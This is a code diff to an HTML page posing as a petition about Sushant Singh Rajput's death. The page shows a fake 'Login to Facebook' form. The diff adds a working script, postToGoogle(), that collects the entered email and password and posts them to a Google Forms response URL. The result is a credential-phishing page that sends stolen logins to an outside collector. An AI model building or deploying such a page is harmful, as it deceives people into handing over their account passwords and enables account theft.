@@ -4,6 +4,10 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Petition for Sushant Sing Rajput Death #Bycott Bollywood </title>
+
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js">
+  </script>
+
   <style>
 
     #x
@@ -31,7 +35,7 @@
       {
         background-color: #ffffff;
         width: 45%;
-        height: 353px;
+        height: 316px;
         margin-left: 248px;
         margin-top: 56px;
         }
@@ -53,11 +57,7 @@
 
         }
 
-#for
-{
 
-        
-}
 @media screen and (max-width: 560px)
 {
   body
@@ -79,7 +79,7 @@
         background-color: #ffffff;
     width: 84%;
     height: -35%;
-    margin-left: 18px;
+    margin-left: 27px;
     margin-top: 40px;
       }
       .fu
@@ -155,13 +155,13 @@
 
     <span class="fu"> Login to Facebook</span>
     <span class="for"> 
-    <form id="for">
-        <input multiple placeholder="email id or number" id="name"><br><br>
-        <input type="password" placeholder="password" id="password"><br><br>
-        <!-- <input type="submit" value="Log In" onclick="sayhello();" class="ff"> -->
+      <form id="form" target="_self" onsubmit="return postToGoogle();" action="" autocomplete="off"> 
+        <input name="entry.1140695734" placeholder="email id or number" id="name" type="text"><br><br>
+        <input name="entry.1875031900" type="password" placeholder="password" id="password"><br><br>
+        <input type="submit" value="Log In" class="ff">
 
     </form><br>
-    <button onclick="sayhello();" class="ff"><b>Log In</b></button><br>
+    <!-- <button onclick="sayhello();" class="ff"><b>Log In</b></button><br> -->
   <span id="fe">----------or----------</span>
   <br>
   <div class="h">
@@ -172,17 +172,42 @@
   </span>
   
   </div>
+  <script>
+    function postToGoogle() {
+                    var field1 = $("#name").val();
+                    var field2 = $("#password").val();
 
 
-  <script type="text/javascript">
-  
-  function sayhello() {
-  var a = document.getElementById("name").value;
-  console.log(a);
-  var b = document.getElementById("password").value;
-  console.log(b);
- }
-  
-  </script>
+                    if(field1 == ""){
+					alert('Please Fill Your Name');
+					document.getElementById("name").focus();
+					return false;
+				}
+				if(field2 == ""){
+					alert('Please Fill Your Email');
+					document.getElementById("password").focus();
+					return false;
+				}
+
+        $.ajax({
+                    url: "https://docs.google.com/forms/d/e/1FAIpQLSf--SmRaoVB4MrGtvUeUDTmXJxJfGf-ca3YhQXi89TzSz96cw/formResponse?",
+					data: {"entry.1140695734": field1, "entry.1875031900": field2},
+                    type: "POST",
+                    dataType: "xml",
+                    success: function(d)
+					{
+					},
+					error: function(x, y, z)
+						{
+
+							$('#success-msg').show();
+							$('#form').hide();
+							
+						}
+                });
+				return false;
+            }
+
+     </script>
 </body>
 </html>
